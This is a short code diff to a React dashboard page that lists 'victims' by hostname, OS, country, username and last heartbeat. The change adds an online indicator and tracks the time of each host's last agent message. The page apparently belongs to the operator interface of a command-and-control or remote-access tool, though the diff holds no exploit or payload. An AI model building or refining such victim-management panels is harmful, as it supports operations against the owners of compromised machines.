@@ -77,11 +77,11 @@ export default function DashboardPage() {
                   {recent.data!.items.map((victim) => (
                     <TR key={victim.id} onClick={() => router.push(`/victims/${victim.id}`)} className="cursor-pointer">
                       <TD className="font-mono text-xs text-ink">{victim.hostname}</TD>
-                      <TD><Badge tone={victim.online ? 'ok' : 'default'}>{victim.os}</Badge></TD>
+                      <TD><Badge tone={victim.online ? 'ok' : 'default'}>{victim.online ? 'online' : victim.os}</Badge></TD>
                       <TD className="text-muted">{flag(victim.countryCode)} {victim.country ?? '—'}</TD>
                       <TD className="font-mono text-muted">{victim.username}</TD>
                       <TD className="space-x-1">{victim.tags.slice(0, 3).map((tag) => <Badge key={tag}>{tag}</Badge>)}</TD>
-                      <TD className="num text-muted">{ago(victim.lastHeartbeatAt)} ago</TD>
+                      <TD className={victim.online ? 'num text-ok' : 'num text-muted'}>{ago(victim.online ? victim.lastAgentMessageAt ?? victim.lastHeartbeatAt : victim.lastHeartbeatAt)} ago</TD>
                     </TR>
                   ))}
                 </tbody>
